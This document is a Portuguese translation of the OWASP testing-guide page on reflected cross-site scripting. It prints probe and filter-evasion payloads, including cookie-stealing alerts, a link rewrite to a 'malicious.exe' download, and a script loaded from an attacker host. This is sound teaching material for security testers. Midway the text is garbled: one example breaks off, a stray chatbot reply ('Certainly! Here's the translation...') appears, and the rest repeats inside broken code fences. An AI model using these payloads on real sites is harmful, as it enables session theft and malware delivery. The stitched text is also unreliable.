# Testando Cross-Site Scripting Refletido (XSS)

|ID          |
|------------|
|WSTG-INPV-01|

## Resumo

O [Cross-site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/) refletido ocorre quando um atacante injeta código executável do navegador dentro de uma única resposta HTTP. O ataque injetado não é armazenado na própria aplicação; é não persistente e afeta apenas os usuários que abrem um link maliciosamente criado ou uma página web de terceiros. A string de ataque é incluída como parte do URI ou parâmetros HTTP criados inadequadamente pela aplicação, e retornada à vítima.

O XSS refletido é o tipo mais frequente de ataques XSS encontrados na natureza. Os ataques XSS refletidos também são conhecidos como ataques XSS não persistentes e, como a carga útil do ataque é entregue e executada por meio de uma única solicitação e resposta, também são referidos como XSS de primeira ordem ou tipo 1.

Quando uma aplicação web é vulnerável a esse tipo de ataque, ela passará a entrada não validada enviada por solicitações de volta ao cliente. O modus operandi comum do ataque inclui uma etapa de design, na qual o atacante cria e testa um URI ofensivo, uma etapa de engenharia social, na qual ela convence suas vítimas a carregar esse URI em seus navegadores, e a execução eventual do código ofensivo usando o navegador da vítima.

Comumente, o código do atacante é escrito na linguagem JavaScript, mas outras linguagens de script também são usadas, como ActionScript e VBScript. Os atacantes geralmente aproveitam essas vulnerabilidades para instalar keyloggers, roubar cookies das vítimas, realizar roubo de área de transferência e alterar o conteúdo da página (por exemplo, links para download).

Uma das principais dificuldades em prevenir vulnerabilidades XSS é a codificação adequada de caracteres. Em alguns casos, o servidor web ou a aplicação web podem não estar filtrando algumas codificações de caracteres. Por exemplo, a aplicação web pode filtrar `<script>`, mas pode não filtrar `%3cscript%3e`, que é simplesmente outra codificação de tags.

## Objetivos do Teste

- Identificar variáveis refletidas nas respostas.
- Avaliar a entrada que elas aceitam e a codificação que é aplicada no retorno (se houver).

## Como Testar

### Teste de Caixa Preta

Um teste de caixa preta incluirá pelo menos três fases:

#### Detectar Vetores de Entrada

Detecte vetores de entrada. Para cada página da web, o testador deve determinar todas as variáveis definidas pelo usuário da aplicação web e como inseri-las. Isso inclui entradas ocultas ou não óbvias, como parâmetros HTTP, dados POST, valores de campos de formulário ocultos e valores predefinidos de rádio ou seleção. Normalmente, editores HTML no navegador ou proxies da web são usados para visualizar essas variáveis ocultas. Veja o exemplo abaixo.

#### Analisar Vetores de Entrada

Analise cada vetor de entrada para detectar vulnerabilidades potenciais. Para detectar uma vulnerabilidade XSS, o testador normalmente usará dados de entrada especialmente criados com cada vetor de entrada. Esses dados de entrada geralmente são inofensivos, mas acionam respostas do navegador da web que manifestam a vulnerabilidade. Dados de teste podem ser gerados usando um aplicativo fuzzer de aplicação web, uma lista predefinida automatizada de strings de ataque conhecidas ou manualmente.
  Alguns exemplos desses dados de entrada são os seguintes:

- `<script>alert(123)</script>`
- `"><script>alert(document.cookie)</script>`

Para uma lista abrangente de cadeias de teste potenciais, consulte a [XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet).

#### Verificar Impacto

Para cada entrada de teste tentada na fase anterior, o testador analisará o resultado e determinará se representa uma vulnerabilidade que tem um impacto real na segurança da aplicação web. Isso requer examinar o HTML resultante da página da web e procurar pela entrada de teste. Uma vez encontrada, o testador identifica quaisquer caracteres especiais que não foram codificados, substituídos ou filtrados corretamente. O conjunto de caracteres especiais vulneráveis e não filtrados dependerá do contexto dessa seção do HTML.

Idealmente, todos os caracteres especiais HTML serão substituídos por entidades HTML. As principais entidades HTML a serem identificadas são:

- `>` (maior que)
- `<` (menor que)
- `&` (e comercial)
- `'` (apóstrofo ou aspas simples)
- `"` (aspas duplas)

No entanto, uma lista completa de entidades é definida pelas especificações HTML e XML. [Wikipedia tem uma referência completa](https://en.wikipedia.org/wiki/List_of_XML_and_HTML_character_entity_references).

Dentro do contexto de uma ação HTML ou código JavaScript, um conjunto diferente de caracteres especiais precisará ser escapado, codificado, substituído ou filtrado. Esses caracteres incluem:

- `\n` (nova linha)
- `\r` (retorno de carro)
- `'` (apóstrofo ou aspas simples)
- `"` (aspas duplas)
- `\` (barra invertida)
- `\uXXXX` (valores Unicode)

Para uma referência mais completa, consulte o [guia JavaScript da Mozilla](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Values,_variables,_and_literals#Using_special_characters_in_strings).

#### Exemplo 1

Por exemplo, considere um site que possui uma mensagem de boas-vindas `Bem-vindo %username%` e um link para download.

![Exemplo de XSS 1](images/XSS_Example1.png)\
*Figura 4.7.1-1: Exemplo de XSS 1*

O testador deve suspeitar que cada ponto de entrada de dados pode resultar em um ataque XSS. Para analisá-lo, o testador irá brincar com a variável do usuário e tentar acionar a vulnerabilidade.

Vamos tentar clicar no seguinte link e ver o que acontece:

```text
http://exemplo.com/index.php?user=<script>alert(123)</script>
```

Se nenhuma sanitização for aplicada, isso resultará na seguinte mensagem pop-up

:

![Alerta](images/Alert.png)\
*Figura 4.7.1-2: Exemplo de XSS 1*

Isso indica que há uma vulnerabilidade de XSS e parece que o testador pode executar código de sua escolha no navegador de qualquer pessoa se ela clicar no link do testador.

#### Exemplo 2

Vamos tentar outro trecho de código (link):

```text
http://exemplo.com/index.php?user=<script>window.onload = function() {var AllLinks=document.getElementsByTagName("a");AllLinks[0].href = "http://badexample.com/malicious.exe";}</script>
```

Isso produz o seguinte comportamento:

![Exemplo de XSS 2](images/XSS_Example2.png)\
*Figura 4.7.1-3: Exemplo de XSS 2*

Isso fará com que o usuário, clicando no link fornecido pelo testador, faça o download do arquivo `malicious.exe` de um site que eles controlam.

### Burlar Filtros XSS

Ataques de cross-site scripting refletida são prevenidos à medida que a aplicação web sanitiza a entrada, um firewall de aplicação web bloqueia entradas maliciosas ou por mecanismos incorporados em navegadores web modernos. O testador deve testar as vulnerabilidades assumindo que os navegadores web não impedirão o ataque. Os navegadores podem estar desatualizados ou ter recursos de segurança incorporados desativados. Da mesma forma, firewalls de aplicação web não garantem o reconhecimento de ataques novos e desconhecidos. Um atacante pode criar uma string de ataque não reconhecida pelo firewall de aplicação web.

Portanto, a maioria da prevenção de XSS deve depender da sanitização de entrada não confiável pela aplicação web. Existem vários mecanismos disponíveis para desenvolvedores de sanitização, como retornar um erro, remover, codificar ou substituir a entrada inválida. A maneira pela qual a aplicação detecta e corrige a entrada inválida é outra fraqueza principal na prevenção de XSS. Uma lista de negação pode não incluir todas as strings de ataque possíveis, uma lista de permissão pode ser excessivamente permissiva, a sanitização pode falhar ou um tipo de entrada pode ser confiado incorretamente e permanecer não sanitizado. Todas essas permitem que os atacantes contornem os filtros XSS.

A [XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet) documenta testes comuns de evasão de filtros.

#### Exemplo 3: Valor do Atributo da Tag

Como esses filtros são baseados em uma lista de negação, eles podem não bloquear todos os tipos de expressões. De fato, existem casos em que um exploit de XSS pode ser realizado sem o uso de tags `<script>` e mesmo sem o uso de caracteres como `<` e `>` que são comumente filtrados.

Por exemplo, a aplicação web pode usar o valor de entrada do usuário para preencher um atributo, como mostrado no seguinte código:

```html
<input type="text" name="state" value="INPUT_FROM_USER">
```

Em seguida, um atacante pode enviar o seguinte código:

```text
" onfocus="alert(document.cookie)
```

#### Exemplo 4: Sintaxe ou Codificação Diferente

Em alguns casos, é possível que filtros baseados em assinatura possam ser facilmente derrotados obfuscando o ataque. Normalmente, isso pode ser feito pela inserção de variações inesperadas na sintaxe ou na codificação. Essas variações são toleradas pelos navegadores como HTML válido quando o código é retornado, e ainda podem ser aceitas pelo filtro.

Aqui estão alguns exemplos:

- `"><script >alert(document.cookie)</script >`
- `"><ScRiPt>alert(document.cookie)</ScRiPt>`
- `"%3cscript%3ealert(document.cookie)%3c/script%3e`

#### Exemplo 5: Burlando Filtros Não Recursivos

Às vezes, a sanitização é aplicada apenas uma vez e não é realizada de forma recursiva. Nesse caso, o atacante pode burlar o filtro enviando uma string contendo várias tentativas, como esta:

```text
<scr<script>ipt>alert(document.cookie)</script>
```

#### Exemplo 6: Incluindo Script Externo

Agora, suponha que os desenvolvedores do site alvo implementaram o seguinte código para proteger a entrada da inclusão de script externo:

```php
<?
    $re = "/<script[^>]+src/i";

   
```

Certainly! Here's the translation of the provided text to Portuguese (Brazilian) along with the Markdown formatting:

```md
## Exemplo 6: Inclusão de Script Externo

Suponha agora que os desenvolvedores do site de destino implementaram o seguinte código para proteger a entrada contra a inclusão de scripts externos:

```php
<?
    $re = "/<script[^>]+src/i";

    if (preg_match($re, $_GET['var']))
    {
        echo "Filtrado";
        return;
    }
    echo "Bem-vindo ".$_GET['var']." !";
?>
```

Desacoplando a expressão regular acima:

1. Verifique por `<script`
2. Verifique por um espaço em branco
3. Qualquer caractere, exceto o caractere `>` por uma ou mais ocorrências
4. Verifique por `src`

Isso é útil para filtrar expressões como `<script src="http://atacante/xss.js"></script>`, que é um ataque comum. No entanto, neste caso, é possível contornar a sanitização usando o caractere `>` em um atributo entre script e src, como este:

```text
http://exemplo/?var=<SCRIPT%20a=">"%20SRC="http://atacante/xss.js"></SCRIPT>
```

Isso explorará a vulnerabilidade de script entre sites refletida mostrada anteriormente, executando o código JavaScript armazenado no servidor web do atacante como se ele estivesse originado do site da vítima, `http://exemplo/`.

## Exemplo 7: Poluição de Parâmetros HTTP (HPP)

Outro método para contornar filtros é a Poluição de Parâmetros HTTP (HPP). Essa técnica foi apresentada pela primeira vez por Stefano di Paola e Luca Carettoni em 2009 na conferência OWASP Poland. Veja o [Teste para Poluição de Parâmetros HTTP](04-Teste_para_Poluicao_de_Parametros_HTTP.md) para mais informações. Essa técnica de evasão consiste em dividir um vetor de ataque entre vários parâmetros que têm o mesmo nome. A manipulação do valor de cada parâmetro depende de como cada tecnologia web está analisando esses parâmetros, então esse tipo de evasão nem sempre é possível. Se o ambiente testado concatenar os valores de todos os parâmetros com o mesmo nome, então um atacante poderia usar essa técnica para contornar mecanismos de segurança baseados em padrões.
Ataque regular:

```text
http://exemplo/pagina.php?param=<script>[...]</script>
```

Ataque usando HPP:

```text
http://exemplo/pagina.php?param=<script&param=>[...]</&param=script>
```

Veja a [Cheat Sheet de Evasão de Filtro XSS](https://owasp.org/www-community/xss-filter-evasion-cheatsheet) para uma lista mais detalhada de técnicas de evasão de filtro. Finalmente, analisar respostas pode se tornar complexo. Uma maneira simples de fazer isso é usar código que abre um diálogo, como em nosso exemplo. Isso geralmente indica que um atacante poderia executar JavaScript arbitrário de sua escolha nos navegadores dos visitantes.

### Teste de Caixa Cinza

O teste de caixa cinza é semelhante ao teste de caixa preta. No teste de caixa cinza, o testador de penetração tem conhecimento parcial da aplicação. Neste caso, informações sobre a entrada do usuário, controles de validação de entrada e como a entrada do usuário é renderizada de volta para o usuário podem ser conhecidas pelo testador de penetração.

Se o código-fonte estiver disponível (teste de caixa branca), todas as variáveis recebidas dos usuários devem ser analisadas. Além disso, o testador deve analisar quaisquer procedimentos de saneamento implementados para decidir se esses podem ser contornados.

## Ferramentas

- [Codificador de Conjunto de Caracteres PHP (PCE)](https://cybersecurity.wtf/encoder/) ajuda a codificar textos arbitrários para e de 65 tipos de conjuntos de caracteres que você pode usar em seus payloads personalizados.
- [Hackvertor](https://hackvertor.co.uk/public) é uma ferramenta online que permite muitos tipos de codificação e ofuscação de JavaScript (ou qualquer entrada de string).
- [XSS-Proxy](http://xss-proxy.sourceforge.net/) é uma ferramenta avançada de ataque de Cross-Site-Scripting (XSS).
- [ratproxy](https://code.google.com/archive/p/ratproxy/) é uma ferramenta de auditoria de segurança de aplicativos da web semiautomatizada, otimizada para detecção precisa e sensível, e anotação automática, de problemas potenciais e padrões de design relevantes para a segurança com base na observação de tráfego existente iniciado pelo usuário em ambientes web 2.0 complexos.
- [Burp Proxy](https://portswigger.net/burp/) é um servidor proxy HTTP/S interativo para atacar e testar aplicativos da web.
- [OWASP Zed Attack Proxy (ZAP)](https://www.zaproxy.org) é um servidor proxy HTTP/S interativo para atacar e testar aplicativos da web com um scanner integrado.

## Referências

### Recursos da OWASP

- [Cheat Sheet de Evasão de Filtro XSS](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)

### Livros

- Joel Scambray, Mike Shema, Caleb Sima - "Hacking Exposed Web Applications", Segunda Edição, McGraw-Hill, 2006 - ISBN 0-07-226229-0
- Dafydd Stuttard, Marcus Pinto - "Manual de Aplicações Web - Descobrindo e Explorando Falhas de Segurança", 2008, Wiley, ISBN 978-0-470-17077-9
- Jeremiah Grossman, Robert "RSnake" Hansen, Petko "pdp" D. Petkov, Anton Rager, Seth Fogie - "Ataques de Cross Site Scripting: Explorações e Defesa", 2007, Syngress, ISBN-10: 1-59749-154-3

### Artigos Técnicos

- [CERT - Tags HTML Maliciosas Incorporadas em Solicitações Web do Cliente](https://resources.sei.cmu.edu/asset_files/WhitePaper/2000_019_001_496188.pdf)
- [cgisecurity.com - O FAQ de Cross Site Scripting](https://www.cgisecurity.com/xss-faq.html)
- [

G.Ollmann - Injeção de Código HTML e Cross-site scripting](http://www.technicalinfo.net/papers/CSS.html)
- [S. Frei, T. Dübendorfer, G. Ollmann, M. May - Compreendendo a ameaça do navegador da web](https://www.techzoom.net/Publications/Insecurity-Iceberg)
```